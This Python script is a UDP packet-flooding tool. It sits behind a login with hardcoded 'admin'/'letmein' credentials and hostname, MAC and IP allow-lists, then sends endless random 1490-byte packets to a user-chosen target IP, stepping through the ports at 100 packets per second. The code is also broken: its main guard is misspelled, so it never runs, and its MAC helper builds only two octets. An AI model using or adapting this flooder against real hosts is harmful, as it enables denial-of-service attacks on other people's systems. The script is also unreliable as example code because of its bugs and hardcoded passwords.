import socket
import secrets
import time
from datetime import datetime
import ipaddress
import getpass
import platform
import os
import uuid

# === Helper Functions ===

def get_system_info():
    info = {
        "Username": getpass.getuser(),
        "OS": platform.system(),
        "OS Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "Hostname": platform.node(),
    }
    print("\n[System Info]")
    for key, value in info.items():
        print(f"{key}: {value}")
    return info

def get_mac_address():
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
                   for elements in range(0, 2*6, 8)][::-1])
    return mac

def get_local_ip():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        return local_ip
    except:
        return "Unknown"

def log_attempt(username, result):
    with open("access_log.txt", "a") as f:
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"{now} | Username: {username} | Result: {result}\n")

# === Security Functions ===

def simulate_user_check():
    spoofed_user = input("Enter username to simulate: ").strip()
    allowed_user = "admin"
    allowed_password = "letmein"

    if spoofed_user != allowed_user:
        print(f"❌ Unauthorized user: {spoofed_user}")
        log_attempt(spoofed_user, "Unauthorized User")
        exit(1)
    if input("Enter password: ") != allowed_password:
        print("❌ Incorrect password.")
        log_attempt(spoofed_user, "Wrong Password")
        exit(1)
    print("✅ User authentication passed.")
    log_attempt(spoofed_user, "Access Granted")

def restrict_by_device():
    system_info = get_system_info()
    allowed_hostname = "parrot-lab"
    allowed_macs = ["00:1a:2b:3c:4d:5e", "de:ad:be:ef:ca:fe"]
    allowed_ips = ["192.168.0.10", "10.0.0.42"]

    current_mac = get_mac_address()
    current_ip = get_local_ip()

    if system_info["Hostname"] != allowed_hostname:
        print("⛔ Access denied: unauthorized hostname.")
        exit(1)

    if current_mac.lower() not in allowed_macs:
        print(f"⛔ Access denied: unauthorized MAC address ({current_mac}).")
        exit(1)

    if current_ip not in allowed_ips:
        print(f"⛔ Access denied: unauthorized IP address ({current_ip}).")
        exit(1)

    print("✅ Device authentication passed.")

# === Packet Sending ===

def create_socket(is_ipv6=False):
    family = socket.AF_INET6 if is_ipv6 else socket.AF_INET
    sock = socket.socket(family, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    return sock

def get_target_ip():
    while True:
        ip = input("Enter target IP address (IPv4 or IPv6): ").strip()
        try:
            ip_obj = ipaddress.ip_address(ip)
            return ip, ip_obj.version == 6
        except ValueError:
            print("Invalid IP address format. Please try again.")

def get_target_port():
    while True:
        try:
            port = int(input("Enter target port number: "))
            if 0 <= port <= 65535:
                return port
            else:
                print("Port must be between 0 and 65535.")
        except ValueError:
            print("Invalid input. Please enter a number.")

def send_packets(ip, port, rate_limit, is_ipv6=False):
    sock = create_socket(is_ipv6)
    sent = 0
    try:
        while True:
            data = secrets.token_bytes(1490)
            sock.sendto(data, (ip, port))
            sent += 1
            port = (port + 1) % 65536
            print(f" Sent {sent} packet to {ip} on port {port}")
            time.sleep(1 / rate_limit)
    except socket.error as e:
        print(f"Socket error: {e}")
    except KeyboardInterrupt:
        print("Packet sending stopped by user.")
    finally:
        sock.close()

# === Main ===

if _name_ == "_main_":
    simulate_user_check()
    restrict_by_device()

    target_ip, is_ipv6 = get_target_ip()
    target_port = get_target_port()
    rate_limit = 100  # packets per second

    send_packets(target_ip, target_port, rate_limit, is_ipv6)